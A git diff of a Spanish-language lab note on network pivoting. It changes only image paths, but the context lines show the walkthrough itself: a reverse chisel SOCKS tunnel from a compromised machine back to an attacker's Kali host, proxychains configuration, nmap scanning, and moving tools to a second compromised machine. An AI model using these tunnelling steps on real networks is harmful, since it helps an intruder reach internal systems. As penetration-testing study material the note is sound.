@@ -4,7 +4,7 @@ Propietario: Adrian Gisbert Cabello
 
 1. Abrimos instancia de kali con server chisel: `./chisel server --reverse -p 33`
 
-![Untitled](Little%20Pivoting%20Example%20aa3eba8138ba49edb888e28dcf5816fb/Untitled.png)
+![Untitled](Little%20Pivoting%20Example/Untitled.png)
 
 1. Abrimos nueva instancia kali y rompemos la primera máquina
     
@@ -18,15 +18,15 @@ Propietario: Adrian Gisbert Cabello
     
     3.1. activamos socat en la primera maquina como cliente: `./chisel client 10.10.10.1:33 R:socks`
     
-    ![Untitled](Little%20Pivoting%20Example%20aa3eba8138ba49edb888e28dcf5816fb/Untitled%201.png)
+    ![Untitled](Little%20Pivoting%20Example/Untitled%201.png)
     
     3.2. En la maquina atacante añadimos en el archivo `/etc/proxychains4.conf` lo siguiente: `socks5 127.0.0.1:1080`
     
-    ![Untitled](Little%20Pivoting%20Example%20aa3eba8138ba49edb888e28dcf5816fb/Untitled%202.png)
+    ![Untitled](Little%20Pivoting%20Example/Untitled%202.png)
     
     3.3. Nos aseguramos de que quede descomentada la linea de `dynamic` y comentada la de `strict`
     
-    ![Untitled](Little%20Pivoting%20Example%20aa3eba8138ba49edb888e28dcf5816fb/Untitled%203.png)
+    ![Untitled](Little%20Pivoting%20Example/Untitled%203.png)
     
 3. Hacemos escaneo nmap, la rompemos y conseguimos acceso a la maquina2. Nos pasamos los archivos socat, chisel y el script de hosts desde la maquina1 a la maquina2
     
@@ -55,4 +55,4 @@ Propietario: Adrian Gisbert Cabello
 
 Así está bien ordenado:
 
-![Untitled](Little%20Pivoting%20Example%20aa3eba8138ba49edb888e28dcf5816fb/Untitled%204.png)
+![Untitled](Little%20Pivoting%20Example/Untitled%204.png)
